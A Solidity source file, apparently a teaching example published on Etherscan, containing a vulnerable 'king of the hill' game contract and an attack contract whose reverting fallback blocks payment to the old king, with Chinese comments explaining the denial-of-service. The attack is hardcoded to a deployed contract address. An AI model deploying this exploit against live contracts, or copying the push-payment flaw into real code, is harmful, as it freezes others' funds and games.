/**
 *Submitted for verification at Etherscan.io on 2021-06-29
*/

pragma solidity ^0.4.10;

contract PresidentOfCountry {
    address public president;
    uint256 public price;

    constructor() public payable{
        require(msg.value > 0);
        price = msg.value;
        president = msg.sender;
        price = price * 2;
    }
    
    //小明 2 
    //小黃 4
    //小豬 8

    function becomePresident() public payable {
        require(msg.value >= price); // 下一個 president 出的 ether 要比較高
        president.transfer(price);   // 付款給舊國王 
        president = msg.sender;      // 成為新國王
        price = price * 2;           // 價格變兩倍
    }
}

// 攻擊手法：因為遊戲的合約在要被取代為新的國王時，會把新國王的出價給舊國王，
//           因此如果舊國王的地址是合約，將轉過來的交易revert，便永遠無法送
//           錢來, 也就直接讓遊戲合約無法繼續。
contract attack {

    PresidentOfCountry game = PresidentOfCountry(0xcFb7615C826d727e244e189A20C7a68bec757A01);

    function attackFunc() public payable{
        game.becomePresident.value(msg.value)();
    }

    function() public payable{
        revert();
    }
}